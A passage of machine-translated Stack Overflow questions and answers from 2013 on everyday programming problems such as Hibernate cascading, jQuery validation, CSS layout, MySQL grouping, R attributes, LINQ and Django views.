对于服务器端验证，我在 aftersubmit 事件上使用 json 响应，如下所示

```
 navGrid("#pager2",{}, //options
            {height:280,width:700,reloadAfterSubmit:false}, // edit options
            {height:280,width:700,reloadAfterSubmit:false, 
            afterSubmit : function(response, postdata) { 
                var msg = "noError";
                var res = $.parseJSON(response.responseText);
                if (res && res.userMessage) {
                    alert(res.userMessage);
                    msg = res.userMessage;
                }

                //alert(msg);
            if(msg == "noError") {
                return [true, "Validation pass"];
            }   else {
                return [false, msg];
            } 
            }}, // add options

            {reloadAfterSubmit:false}, // del options
            {} // search options
    ); 
```

和struts条目

```
 <action name="jsontableEditValidationApartmentResource" class="com.loa.monitor.action.JsonActionResource" method="editValidate" >
    <result name="success" type = "json"></result>
    <result name="error" type="redirectAction">
            <param name="actionName">proceedApartment</param>
    </result>
</action> 
```

和行动方法

```
 public String editValidate() {
    userMessage = "test msg1";
    return "success";
}

private String userMessage ;

public String getUserMessage() {
    return userMessage;
}

public void setUserMessage(String userMessage) {
    this.userMessage = userMessage;
} 
```

让我知道这是否有用

# wpf - Prism：在 ConfirmNavigationRequest 中获取目标视图

> ID：15244576
> 
> 赞同：1
> 
> 时间：2013-03-06T10:18:35.690
> 
> 标签：wpf, navigation, prism

Prism 允许决定是否可以使用 IConfirmNavigationRequest 接口执行导航请求。这样，在视图被同一区域中的另一个视图替换之前，将调用 ConfirmNavigationRequest 方法。

我想使用这种方法来决定用户可以根据目标导航到哪里。因此，如果用户只是打开设置视图，一切都很好，他可以导航，但如果他想在选择一些数据之前切换到报告页面，那么我必须打开一个消息框告诉他，他必须选择数据。

如何获得对新视图的引用？

# hibernate - 如何修改 hibernate hbm.xml 以摆脱 - org.hibernate.TransientObjectException: object references an unsaved transient instance

> ID：15244580
> 
> 赞同：0
> 
> 时间：2013-03-06T10:18:56.470
> 
> 标签：hibernate, hibernate-mapping

我会尽可能具体，所以我只想在修改这个 hbm.xml 文件方面寻求帮助

我的休眠映射中有这个文件

```
<hibernate-mapping>
<class name="sk.bantip.hotel.server.dao.book.Dealer" table="book_dealer">
    <id column="idBook_dealer" name="id" type="java.lang.Long">
        <generator class="identity" />
    </id>
    <many-to-one name="domain" column="idMain_domain"
        not-null="true" class="sk.bantip.hotel.server.dao.main.Domain" />
    <many-to-one name="activeData" column="idBook_dealerData"
        class="sk.bantip.hotel.server.dao.book.DealerData" />
    <set name="historyData" inverse="true">
        <key column="idBook_dealer" />
        <one-to-many class="sk.bantip.hotel.server.dao.book.DealerData" />
    </set>
    <property name="status" not-null="false" />
</class> 
```

这是关联：

```
<hibernate-mapping>
<class name="sk.bantip.hotel.server.dao.book.DealerData" table="book_dealerData">
    <id column="idBook_dealerData" name="id" type="java.lang.Long">
        <generator class="identity" />
    </id>
    <property name="name" not-null="true"/>
    <property name="registration" not-null="true"/>
    <property name="taxNumber" not-null="true"/>
    <property name="timestamp" not-null="true" />
    <property name="authorUserId" column="idAuthor" not-null="true" />
    <many-to-one name="dealer" column="idBook_dealer"
        not-null="true" class="sk.bantip.hotel.server.dao.book.Dealer" />
    <property name="channel" not-null="false">
        <type name="sk.bantip.core.enums.GenericEnumUserType">
            <param name="enumClass">sk.bantip.hotel.server.dao.book.Channel</param>
            <param name="identifierMethod">getValue</param>
            <param name="valueOfMethod">getByCode</param>
        </type>
    </property>
    <property name="street" not-null="false" />
    <property name="number" not-null="false" />
    <property name="zip" not-null="false" />
    <property name="city" not-null="false" />
    <property name="country" not-null="false" />
    <property name="telephone" not-null="false" />
    <property name="email" not-null="false" />
</class> 
```

我发现一些指南说使用级联操作，当我得到

> org.hibernate.TransientObjectException：对象引用了一个未保存的瞬态实例 - 在刷新之前保存瞬态实例：

但不知道哪个用途，我知道 cascade="all" 但我不知道在这种情况下是否有效，我使用这种方法来保存/更新：

```
public void ajaxNameListener(AjaxBehaviorEvent event) {         
     for(DealerListView diler : dealerList) {
      if(diler.getDealerId() == getSelectedDealerId()) {
         diler.setDealerId(selectedDealerId);   
         DealerData dilerko = new DealerData();
         dilerko.setName(selectedDealerName);
         Dealer dealer = BeanFactory
                 .getHotelDAOService(Dealer.class)
                 .findOne(selectedDealerId);    

          dealer.setActiveData(dilerko);
BeanFactory.getHotelDAOService(Dealer.class).update(dealer);// line 220 - in stacktrace is (at sk.bantip.hotel.web.controller.SalesController.ajaxNameListener(SalesController.java:220))       
   }  
    }
} 
```

有人可以根据这种情况给我一个建议吗？我认为必须在这些 hbm.xml 文件中进行一些更改，在一些级联操作上，但不确定这会是什么，请给我留下一些帖子，我会很高兴为您提供任何帮助 谢谢您，祝您有愉快的一天。

编辑：在子类 DealerData 我有一个**私有**属性，不确定但可能需要`access="field"`在 DealerData.hbm.xml 中添加此属性？因为这允许 Hibernate 从私有变量而不是公共属性中读取值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:34:05.743

不是级联的强烈倡导者，因为您在 HBM.XML 中做出的决定是否级联必须在整个应用程序中保持一致，而且您不太确定您想要哪种类型的级联，我宁愿坚持使用更简单的方法。在您的用例中添加以下内容会是一个坏主意：

```
someDealerDataDAO.persist(dilerko); 
```

就在引发错误的语句之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:24:00.233

`cascade`主要用于父子关系（例如一对一、多对一、一对多、多对多关联）。

在父类的映射文件中定义子关系时，如果您指定`cascade = "save-update"`，它将如下工作：

每当您保存 Parent 类的实例时，如果有任何子实例与之关联，它们也会被保存（如果是暂时的）/更新（如果已经持久化）。在这种情况下，您将无法获得`'TransientObjectException'`.

但是，如果您指定`cascade = "refresh"`了 ，它将按如下方式工作：

每当您保存父类的实例时，只会保存该实例。如果任何子类的实例与之相关联，它们将不会被保存/更新。

话虽如此，如果子类的实例没有持久化到数据库，它会简单地抛出`'TransientObjectException'`. 为避免这种情况，您必须在保存父类的实例之前手动保存子类的实例。

[用这里](http://www.mkyong.com/hibernate/hibernate-cascade-example-save-update-delete-and-delete-orphan/)的例子看看不同的级联选项。

# jquery - jQuery validationEngine：仅验证字段集

> ID：15244582
> 
> 赞同：0
> 
> 时间：2013-03-06T10:18:59.093
> 
> 标签：jquery, slideshow, jquery-validation-engine

我正在构建一个 4 步表单，我只想验证当前可见的字段集。每个“步骤”都有一个提交按钮，所以我希望有以下几点：

```
$('#step-1-button').on('click', function(e){
    $('#step-1-fieldset').validationEngine('validate', {
    onValidationComplete: function(form, status){
        if(status){ goToNextStep() });
    }
}); 
```

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:40:09.503

我不确定validationEngine插件是如何工作的——但是快速阅读文档表明您可以对单个元素调用“验证”操作，并且只验证可以使用jquerys Filter方法的可见字段集。

我会说类似

```
$('#step-1-button').on('click',function(e) {
       e.preventDefault(); 
       var inputs = $('fieldset').filter(':visible').find('input');
       $.each(inputs,function() { 
            $(this).validationEngine('validate');
       });
}); 
```

会工作。

当您通过可见字段集进行过滤时，无论单击哪个按钮，您还可以将事件附加到通用选择器 - 类似于 $('.step-button') - 这将阻止您编写单独的事件处理程序4 步表单中的每个按钮都将有助于保持代码干燥。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-04T15:03:00.250

我认为在您的情况下使用带有验证的**stepy 表单**也不错。它也支持ajax。
像步骤 1,2,3.. + 验证这是你想要的
[Demo](http://wbotelhos.com/stepy)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T15:46:04.563

仅验证表单的一部分的另一种方法是以编程方式添加和删除一个类，例如“必需”。然后在“.required”字段上运行验证。当您浏览表单的四个步骤时，从所有元素中删除所需的元素，然后仅重新应用到需要验证的可见元素。jquery 验证插件的好处是您不需要在 DOM 更改时重新运行它，它会在更新时自动跟踪必需和非必需字段。

# html - CSS定位和clearfix

> ID：15244590
> 
> 赞同：0
> 
> 时间：2013-03-06T10:19:17.443
> 
> 标签：html, css

当我编写网站模板时，我遇到了令人沮丧的定位问题。当我使用相对定位来移动页面的最后一个元素时，在底部我有空白空间。例如：

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" type="text/css" href="main.css" />
        <title>Clearfix test</title>
    </head>
    <body>
        <header>a</header>
        <div id="pageWrapper">
            <div id="page"></div>
        </div>
        <!--<footer></footer>-->
    </body>
 </html>

* {
    margin-left: auto;
    margin-right: auto;
    background: white;
 }
body {
     background: grey;
     padding: 0;
     margin: 0;
 }

header {
     width: 900px;
     height: 150px;
     border: 1px solid red;
}

 #pageWrapper {
     position:relative;
     width: 850px;
     height: 600px;
     top: -40px;
     border: 1px solid green;
 }

 #page {
     position:absolute;
     top: 25px;
     left: 25px;
     border: 1px solid darkgoldenrod;
     height: 550px;;
     width: 800px;
 } 
```

有什么方法可以删除页面底部的这个空白区域？我试图使用 clearfix 但没有任何运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:24:25.300

你给了`top:-40px`

这是`#pagewrapper`空间

删除它并享受

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:32:52.693

在你的 CSS 中，`#pagewrapper`而不是`top:-40px`; 只要给`top:0px;`

[工作演示](http://jsfiddle.net/pDtwE/37/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:40:56.880

试试这个方法。

```
*{
        padding: 0;
        margin: 0;   
     }
    body {
         background: grey;     
     }
    #container{
        width: 900px;
        margin:0px auto;
    }
    header {
         width: 900px;
         height: 150px;
         border: 1px solid red;
    }

     #pageWrapper {
         width:800px;
         padding:40px;
         margin:0px auto;    
         border: 1px solid green;
         margin-top:-40px;
     }

     #page {
         border: 1px solid darkgoldenrod; 
         height:500px;
     } 
```

* * *

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" type="text/css" href="main.css" />
        <title>Clearfix test</title>
    </head>
    <body>
       <div id="container">
        <header>a</header>
        <div id="pageWrapper">
            <div id="page"></div>
        </div> 
        </div>      
    </body>
 </html> 
```

# jquery - Firefox：仅在选定元素外的第二次单击时触发模糊事件有什么方法可以修复它？

> ID：15244592
> 
> 赞同：3
> 
> 时间：2013-03-06T10:19:24.987
> 
> 标签：jquery, firefox

使用我之前的一个问题中的这个[jsfiddle](http://jsfiddle.net/WZLDa/2/)作为示例。对于我的许多设计选择来说，这都是相当有问题的。

```
$(document).ready(function() {
    $('select').on('click', function() {
        $(this).parent().toggleClass('focused');
    }).on('blur', function() {
        $(this).parent().removeClass('focused');
    })
}); 
```

为无论出于何种原因无法使用 jsfiddle 的人编写的代码。

是否有任何已知的解决方案或解决方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-17T21:54:11.913

我一直对此感到困惑，但这似乎只是 Firefox 处理单击选择元素的方式的问题，因为我在 Chrome 或 IE 中没有遇到此问题……而在 Safari 中，它甚至直到第二次才注册单击你点击它的时间。

# asp.net - 如何在我的 SQL Server 连接字符串中指定不同的目录？

> ID：15244595
> 
> 赞同：0
> 
> 时间：2013-03-06T10:19:28.567
> 
> 标签：asp.net, sql-server, asp.net-mvc, entity-framework

我的 web.config 中有以下连接字符串

```
<add name="xxx" 
connectionString="Data Source=(LocalDb)\v11.0;Initial Catalog=xxx;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|\xxx.mdf" 
providerName="System.Data.SqlClient" /> 
```

我现在已经从以下位置移动了我的 mdf 文件：

```
C:\K\ST18 Mar 4\WebUx\App_Data\xxx.mdf 
```

至：

```
C:\K\ST18 Mar 4\xxx.Data.Store\App_Data\xxx.mdf 
```

我试图将它放入 web.config 但它不会接受“C:\”等。

如何更改我的 Web 配置以使 AttachDBFilename 正确。请注意， xxx.Data.Store 是同一解决方案中的姊妹项目，所以我想让我的路径上升一个目录，然后下降到 xxx.Data.Store\App_Data

# wpf - prism 是纯 mvvm 平台吗？

> ID：15244596
> 
> 赞同：1
> 
> 时间：2013-03-06T10:19:30.510
> 
> 标签：wpf, mvvm, prism

我现在使用 WPF 已经有一段时间了。我使用的平台是 MVVM Light。我必须说我没有在代码隐藏文件中添加一行代码。

最近我深入研究了 Prism，我看到了很多例子，其中代码隐藏（例如数据上下文或属性更改事件）是理所当然的事情。

Prism 是否被视为纯 mvvm 平台？

虽然这个IoC的实现还是打破了mvvm的规则：

```
[Import]
public MainViewModel ViewModel
{
    set { DataContext = value; }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:31:42.477

不，Prism 是一个[**复合应用程序**](http://compositewpf.codeplex.com/)平台（如果*平台*是正确的名称，可能*库*更好）。

您想使用 MVVM 的事实与 Prism 本身无关。您*可以*一起使用 MVVM 和 Prism。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T16:53:51.680

Prism 是一个基于 Microsoft 推荐的实践构建复杂、复合应用程序的框架。MVVM 是一种实践，另一种是应用程序的模块化。这就是为什么你可以看到一个使用 Prism 但不遵循 MVVM 的应用程序 - 它只是具有模块化结构并使用 Prism 来延迟模块下载、声明性模块等。

但是 Prism 本身就是优秀的 MVVM 框架。它提供了基本 MVVM 模式的实现：

*   基本视图模型 - NotifyProertyChangesBase
*   命令 - 委托命令
*   视图模型之间的通知（用于复合应用程序） - EventAggregator
*   可用于视图模型级别的用户通知的抽象 - 通知
*   尊重视图模型单元测试的 DI 原则
*   将视图模型映射到视图的扩展能力 - 区域

Prism 作为 MVVM 框架对于小型应用程序来说很重，但它非常强大且可扩展，我看到了使用 Prism 创建的良好的复合 MVVM 设计应用程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T13:27:20.577

`Prism`是一个促进者`MVVM`，而不是一个平台。遵循`MVVM`. 我怀疑有许多 Prism 应用程序不遵循`MVVM`. 我什至做过一个。

# iphone - 如何将 MWPhotoBrowser 与我现有的 StoryBoard 集成

> ID：15244601
> 
> 赞同：0
> 
> 时间：2013-03-06T10:19:52.057
> 
> 标签：iphone, ios, objective-c, xcode, mwphotobrowser

MWPhotoBrowser 没有使用任何 xib 文件。我的项目正在使用 StoryBoard。

所以我所做的是。我用了`[navigationcontroller pushviewcontroller:mwphotobrowser anomated:yes]`

推送到 MWPhotoBrowser。一切正常，除了。

当我点击 MWPhotoBrowser 中的后退按钮时，它会将我带到上一个视图（NavigationViewController 按钮似乎已加载），但背景是黑色的，我看不到我以前的 ViewController 的内容。

我不知道我做错了什么。

我希望它的行为类似于常规的故事板导航，这样当我单击返回时，它会将我带到上一个视图并显示其内容。现在它将以前的视图显示为黑屏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:39:25.810

我刚刚解决了这个问题。这是我做错了什么。

我从另一个视图控制器的 viewdidload 调用 MWPhotobrowser，因此它的行为很奇怪。

我通过按钮的操作调用它，现在一切正常。

问题的解决方案 -> 不要从 ViewDidload 调用它

# xpages - XPages 在重复控件中获取文档句柄

> ID：15244604
> 
> 赞同：0
> 
> 时间：2013-03-06T10:19:56.583
> 
> 标签：xpages, xpages-ssjs

我有一个绑定到视图数据源的重复控件。

在每一行中，我都有一个链接，当按下该链接时，我想用一些字段值更改标记该后端文档，然后保存这些更改。如果保存时发生错误，我想告诉用户我希望刷新存在重复的面板。

如何获取与该行关联的文档并测试保存是否有效？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:47:52.010

快到了，但后端文档没有改变:o(

我的重复控件内的链接代码...

```
var doc:NotesDocument = data.getDocument();
var dt:NotesDateTime = session.createDateTime("Today");
dt.setNow();
doc.replaceItemValue("RcptDate", dt);
doc.replaceItemValue("RcptBy", sessionScope.get("customerBuyerName"));
doc.replaceItemValue("RcptStatus", "Receipted");

var dsName = "vdsReceipts.DATASOURCE";
var app = facesContext.getApplication();
var ds = app.getVariableResolver().resolveVariable(facesContext, dsName);
var ret = ds.save( facesContext, true ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:05:13.533

尝试在文档上调用保存，而不是视图数据源：

```
var doc:NotesDocument = data.getDocument();
var dt:NotesDateTime = session.createDateTime("Today");
dt.setNow();
doc.replaceItemValue("RcptDate", dt);
doc.replaceItemValue("RcptBy", sessionScope.get("customerBuyerName"));
doc.replaceItemValue("RcptStatus", "Receipted");
doc.save(true, false); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T16:21:22.390

我很好奇脚本是否正在获取文档的句柄。如果重复控件中没有 var="data" ，则它永远不会获得文档的句柄。

更大的问题是，您永远不会发出 doc.Save，而是保存不同的对象。因此，将保存添加到脚本的上半部分。

```
var doc:NotesDocument = data.getDocument();
var dt:NotesDateTime = session.createDateTime("Today");
dt.setNow();
doc.replaceItemValue("RcptDate", dt);
doc.replaceItemValue("RcptBy", sessionScope.get("customerBuyerName"));
doc.replaceItemValue("RcptStatus", "Receipted");
doc.Save(); 
```

实际保存后，您可以查看数据源以查看它是否已保存。如果它们都在同一个数据库中，我认为那将是矫枉过正。

希望这样做。

# r - 从矩阵列表中获取元素

> ID：15244608
> 
> 赞同：2
> 
> 时间：2013-03-06T10:20:09.190
> 
> 标签：r, matrix

假设我有一个小矩阵列表，并且想要提取每个矩阵的加入。`attr()`除了循环函数之外，有什么好的方法可以做到这一点。

矩阵数据：

```
tfmatrx<-list(

MA0275.1 = structure(c(0, 76, 0, 24, 0, 100, 0, 0, 0, 0, 
                       100, 0, 0, 0, 100, 0, 72, 11, 16, 0, 53, 0, 0, 47), .Dim = c(4L, 
                                                                                    6L), .Dimnames = list(c("A", "C", "G", "T"), NULL), id = "MA0275.1", accession = "ASG1"), 
MA0276.1 = structure(c(0, 220, 8, 35, 0, 291, 0, 3, 61, 21, 
                       133, 10, 58, 54, 101, 12, 130, 0, 54, 0, 0, 11, 8, 147, 33, 
                       150, 8, 35, 80, 0, 92, 26, 0, 8, 249, 19, 0, 0, 256, 18), .Dim = c(4L, 
                                                                                          10L), .Dimnames = list(c("A", "C", "G", "T"), NULL), id = "MA0276.1", accession = "ASH1"), 
MA0277.1 = structure(c(63, 13, 13, 13, 100, 0, 0, 0, 100, 
                       0, 0, 0, 88, 13, 0, 0, 75, 0, 25, 0, 0, 0, 100, 0, 78, 16, 
                       3, 3, 81, 6, 6, 6, 63, 13, 13, 13), .Dim = c(4L, 9L), .Dimnames = list(
                         c("A", "C", "G", "T"), NULL), id = "MA0277.1", accession = "AZF1"), 
MA0278.1 = structure(c(64, 217, 425, 292, 104, 552, 150, 
                       192, 484, 111, 114, 288, 78, 401, 186, 333, 455, 51, 370, 
                       122, 248, 34, 670, 46, 98, 724, 143, 33, 52, 918, 7, 20, 
                       348, 346, 280, 24, 12, 3, 977, 6, 966, 5, 23, 4, 26, 6, 962, 
                       4, 9, 10, 4, 975, 47, 930, 7, 15, 892, 42, 16, 49, 487, 123, 
                       320, 68, 288, 140, 317, 254, 373, 110, 81, 434, 178, 367, 
                       184, 268, 402, 140, 341, 114, 435, 229, 241, 94), .Dim = c(4L, 
                                                                                  21L), .Dimnames = list(c("A", "C", "G", "T"), NULL), id = "MA0278.1", accession = "BAS1")) 
```

我想在字符向量或 data.frame 中获取所有加入。我知道如何对列表中的第一个元素执行此操作，但是如何对所有加入项执行此操作？

我想在这里实现的输出是：

> ```
> ASG1
> ASH1
> ASF1
> BAS1 
> ```

`names(tfmatrix)`提供所有名称，但不提供加入，任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-06T10:23:18.793

怎么样

```
lapply(tfmatrx, attr, "accession")
$MA0275.1
[1] "ASG1"

$MA0276.1
[1] "ASH1"

$MA0277.1
[1] "AZF1"

$MA0278.1
[1] "BAS1" 
```

您也可以使用`sapply`，这很方便，因为输出是一个向量（sapply 尝试尽可能简化结果）。

```
sapply(tfmatrx, attr, "accession")
MA0275.1 MA0276.1 MA0277.1 MA0278.1 
  "ASG1"   "ASH1"   "AZF1"   "BAS1" 
```

这相当于上面未列出的`lapply`解决方案。

```
unlist(lapply(tfmatrx, attr, "accession"))
MA0275.1 MA0276.1 MA0277.1 MA0278.1 
  "ASG1"   "ASH1"   "AZF1"   "BAS1" 
```

# mysql - 选择具有 2 种排序类型的记录

> ID：15244609
> 
> 赞同：1
> 
> 时间：2013-03-06T10:20:11.813
> 
> 标签：mysql, sql, sorting, subquery

我在 mySQL 中有 2 个表，其中包含以下数据：

表格1：

```
id     |   title
-------+-----------
1      |  Test 1
2      |  Test 2
3      |  Test 3
4      |  Test 4 
```

表 2：

```
id     |  table1_id   |   price
-------+--------------+----------
1      | 1            | 15000
2      | 1            | 2000
3      | 1            | 32600
4      | 2            | 1000
5      | 3            | 4000
6      | 4            | 5500
7      | 2            | 3000 
```

现在我想`Table 1`按`id`排序选择所有记录并从中选择最大`price`的，`Table 2`所以我写了这个查询：

```
SELECT a.*, b.price
FROM table1 AS a, table2 AS b
WHERE a.id = b.table1_id
GROUP BY a.id
ORDER BY a.id ASC, b.price DESC 
```

但结果是第一个价格在`Table 2`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:24:04.157

试试这个：

```
SELECT DISTINCT a.*, MAX(b.price)
FROM table1 AS a, table2 AS b
WHERE a.id = b.table1_id
GROUP BY a.id
ORDER BY a.id ASC 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:24:40.743

您可以使用 group by 或 subselect 来完成（更好的解决方案，将选择不带价格的 table1 记录）

```
SELECT
    a.*,
    b.price
FROM table1 AS a
LEFT OUTER JOIN
(
    SELECT  
        table1_id,
        MAX(price) AS price
    FROM table2
    GROUP BY table1_id
) AS b
    ON b.table1_id = a.id
ORDER BY a.id ASC, b.price DESC 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:26:55.410

您需要的是第二张桌子上的分组最大值。

```
SELECT a.*, b.price
FROM table1 a
JOIN table2 b ON a.id = b.table1_id
LEFT JOIN table2 b2 ON b.table1_id=b2.table1_id AND b.price<b2.price
WHERE b2.id IS NULL
ORDER BY a.id ASC; 
```

此查询的优点是您可以从第二个表中选择所有数据，而不仅仅是最高价格。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:32:51.497

尝试

```
SELECT t1 . * , MAX( t2.price ) 
FROM table1 t1, table2 t2
WHERE t1.id = t2.table1_id
GROUP BY t1.id
ORDER BY t1.id ASC 
```

# ruby-on-rails - IE7 不支持 wysihtml5 编辑器

> ID：15244613
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:20:23.090
> 
> 标签：ruby-on-rails, internet-explorer, wysihtml5

我在我的 rails app 中使用 wysihtml5 编辑器。它在所有浏览器中都能正常工作，但在 IE < 8 中不能正常工作。如何在小于 IE8（例如 IE 7）的 IE 浏览器上使用此编辑器？我正在使用 gem 'bootstrap-wysihtml5-rails'。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:46:51.130

如果您查看 wysihtml5 github 页面，您会发现它支持 IE8+ ( [https://github.com/xing/wysihtml5#browser-support](https://github.com/xing/wysihtml5#browser-support) )。所以不支持IE7。

它会优雅地降级，因此 IE7 和 IE6 用户可以编辑纯 HTML。

您可以使用其他支持 IE7 的编辑器，例如[CKEditor](http://ckeditor.com/) ( [Supports IE6+](http://docs.cksource.com/CKEditor_3.x/Users_Guide/Compatibility) )

# c# - 使用 Linq 在文本中查找

> ID：15244619
> 
> 赞同：0
> 
> 时间：2013-03-06T10:21:02.607
> 
> 标签：c#, linq

所以我有这样的结构来搜索文本中的单词

```
 FileStream fs = new FileStream(fileName, FileMode.Open);
 StreamReader sr = new StreamReader(fs);
 fullText = sr.ReadToEnd();
 string[] arr = fullTetx.Split(' ');
 for (int i = 0; i < arr.Length; i++)//
 {
       if (arr[i].Trim() == "LOAD")
           Console.WriteLine(arr[i].Trim());
 }
 sr.Close();
 fs.Close(); 
```

我必须让所有类似的词都忽略 Linq 的大小写。

例如：

> 负载（绘图）= SET 4 = THRU 16,34 THRU 37, 48 THRU 53,61 FORCE（PLOT,CORNER）ds STRESS（PLOT,CORNER）妈妈爸爸 SPC = 1 负载 = 1 负载，负载。

我必须得到：

> 负载 负载 负载

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-06T10:27:09.143

我不确定我是否理解 LOAD 的来源。它是硬编码的吗？如果是，那么类似：

```
foreach(var word in arr.Where(w => w.ToUpper() == "LOAD"))
    Console.WriteLine(word); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:29:52.493

```
var matches = Regex.Matches(fullTetx, @"load", RegexOptions.IgnoreCase); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:28:26.770

试试这个

```
 var result = arr.Where(x => string.Equals(x, "LOAD",StringComparison.OrdinalIgnoreCase)).ToList(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:49:14.820

或者怎么样：

```
// If you want the lines that contain "LOAD"
var loads = File.ReadLines(fileName).
            SelectMany (l => l.Split(' ')).
            Where (s => s.ToUpperInvariant().Contains("LOAD"));

foreach(var s in loads)
{
    Console.WriteLine(s);
}

// If you just want instances of "LOAD"
var loads = File.ReadLines(fileName).
            SelectMany (l => l.Split(' ')).
            Where (s => s.ToUpperInvariant() == "LOAD");

foreach(var s in loads)
{
    Console.WriteLine(s);
} 
```

# css - 为什么我的 CSS 掩码代码在 Firefox 中不起作用？

> ID：15244621
> 
> 赞同：4
> 
> 时间：2013-03-06T10:21:04.820
> 
> 标签：css, firefox, mask

我想在图像上制作蒙版。

它在 Chrome 中运行良好，所以我必须做正确的事情。

这是代码：

```
<style type="text/css">
  .element {
    width: 250px;
    height: 250px;
    overflow: hidden;
    color: #fff;
    background: url(images/film.png);
    mask:url(images/cat.svg);
    -webkit-mask-image: url(images/cat.svg);
  }
</style>
</head>

<body>
  <div class="element">
  </div><img src="images/cat.svg" width="250" height="250" />
</body> 
```

可在此处查看：[kindervakantiepas.nl/mask/mask.html](http://kindervakantiepas.nl/mask/mask.html)

为什么它在 Firefox 中不起作用？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-06T11:14:44.120

问题在于 svg 本身。你没有定义掩码。我在另一个项目中遇到了一个类似的问题，并想出了一个像这样的 svg。你会在[这里](http://jsfiddle.net/axelmichel/DrEPj/)找到一个工作示例：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
    <!ENTITY ns_svg "http://www.w3.org/2000/svg">
    <!ENTITY ns_xlink "http://www.w3.org/1999/xlink">
]>
<svg xmlns="&ns_svg;" xmlns:xlink="&ns_xlink;" width="313.204" height="377.418" viewBox="0 0 313.204 377.418" >
<defs>
    <mask id="maskid" maskUnits="objectBoundingBox">
    <polygon stroke="#FFFFFF" fill="#FFFFFF" stroke-miterlimit="10" points="56.609,171.248 116.609,207.586 189.849,165.896 182.243,136.037 
    174.638,108.994 208.159,98.854 209.849,74.628 189.567,59.698 200.553,38.008 181.116,58.572 163.651,56.037 154.074,32.938 
    156.328,54.064 148.722,59.98 148.44,83.642 118.018,92.375 78.863,111.248 69.286,144.769 50.13,86.177 "/>
    </mask>
</defs>
<g>
<polygon stroke="#FFFFFF" stroke-miterlimit="10" points="56.609,171.248 116.609,207.586 189.849,165.896 182.243,136.037 
    174.638,108.994 208.159,98.854 209.849,74.628 189.567,59.698 200.553,38.008 181.116,58.572 163.651,56.037 154.074,32.938 
    156.328,54.064 148.722,59.98 148.44,83.642 118.018,92.375 78.863,111.248 69.286,144.769 50.13,86.177 "/>
</g>
</svg> 
```

对于 FF，您可以通过 id 引用使用掩码（在本例中：maskid）：

在 CSS 中：

```
.element {
    background: url("images/film.png") repeat scroll 0 0 transparent;
    color: #FFFFFF;
    height: 250px;
    overflow: hidden;
    width: 250px;
    mask: url("images/cat.svg#maskid");
    -webkit-mask-image: url(images/cat.svg);
} 
```

# java - 保存和读取磁盘上的文件

> ID：15244622
> 
> 赞同：-5
> 
> 时间：2013-03-06T10:21:11.140
> 
> 标签：java

我的应用程序中生成了一个带有双元素的矩阵，我想将它保存在磁盘上，然后在另一个应用程序中读取它并访问矩阵中的每个元素。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:22:18.820

如果它是一个双精度数组，[序列化](http://docs.oracle.com/javase/tutorial/jndi/objects/serial.html)看起来是一个相对简单的解决方案，因为默认情况下 Java 数组和双精度都是可序列化的。有关更多详细信息，请参阅[此 SO 问题](https://stackoverflow.com/questions/1467193/java-serialization-of-multidimensional-array)。

# python - 根据用户权限显示基于 django 类的视图数据？

> ID：15244623
> 
> 赞同：0
> 
> 时间：2013-03-06T10:21:16.303
> 
> 标签：python, django

我有可以通过多种方式查看的数据。不同的方式取决于用户是否登录/匿名，如果用户登录，则取决于用户是否是帖子的作者/读者。

我一直在查看基于 django 类的视图和 django 大括号，但我还没有找到解决这个问题的既定答案。我假设这种决策将导致树结构，到目前为止，我看到的代码根据用户的权限将用户引导到一个 url，它不会根据用户的权限显示不同类型的数据权限/登录状态。

处理这个问题的最佳方法是什么？或者是否有我错过或没有看到处理这个问题的代码？

注意：我想使用基于 django 类的视图。

例如：

我访问了一个 stackoverflow 帖子。

显示帖子和评论。

如果是匿名用户，则显示加入 stackoverflow 数据元素。

如果登录用户，请检查是否作者。

如果是作者，则显示编辑帖子数据元素。

如果不是作者，则不显示编辑帖子数据元素。

如何正确表示 django CBV 中的上述条件语句？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T15:53:16.817

如果我是你，我会在模板中这样做：

```
{% if user == post.author %}
    display edit button
{% else %}
    display view button or something else
